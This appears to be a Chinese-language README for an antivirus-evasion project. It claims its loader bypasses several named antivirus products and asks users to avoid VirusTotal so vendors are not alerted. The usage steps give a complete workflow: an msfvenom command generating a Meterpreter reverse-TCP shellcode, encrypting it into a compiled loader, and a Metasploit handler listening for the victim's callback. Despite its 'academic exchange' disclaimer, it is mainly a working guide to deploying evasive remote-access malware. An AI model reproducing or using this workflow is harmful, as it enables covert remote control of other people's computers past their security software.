# Antivirus_killer
免杀主流防病毒软件<br />


测试于2025年10月22日内存免杀版本_2025_10_22可过最新版火绒、360核晶模式、windows自带杀软、卡巴斯基<br />
微步云沙箱0/24，VT 6/73，麻烦大家少跑VT，VT会给病毒厂商同步报告，且用且珍惜<br />
该项目仅供学术交流参考，请大家合法学习和使用项目<br />
该项目一步一步展示免杀技术和杀毒技术之间的技术演进，希望大家都能有所收获，看不懂的可以扔给AI
# 使用方法
## 生成shellcode
msfvenom LHOST=x.x.x.x LPORT=443 -p windows/x64/meterpreter/reverse_tcp -f c
## 加密shellcode 
将生成的shellcode复制到加密器.c的buf变量中并编译运行
## 编译加载器
将加密后的shellcode 复制到加载器的shellcode变量中编译
PS:编译出来的可执行程序名称应该和程序中第7行的防护一至
## 准备msf监听器
msfconsole<br />
use exploit/multi/handler<br />
set payload windows/x64/meterpreter/reverse_tcp<br />
set LHOST x.x.x.x<br />
set LPORT 443<br />
run<br />
## 双击编译好的exe观察是否上线
![image](https://github.com/user-attachments/assets/d840c522-d096-4e4d-805e-3aca6461b1d7)
![image](https://github.com/user-attachments/assets/07ab4dc0-46e6-41d3-ba2a-f7ab50b3f94c)
![image](https://github.com/user-attachments/assets/fa7548d4-d093-4c36-9483-f6f1b2355bc5)



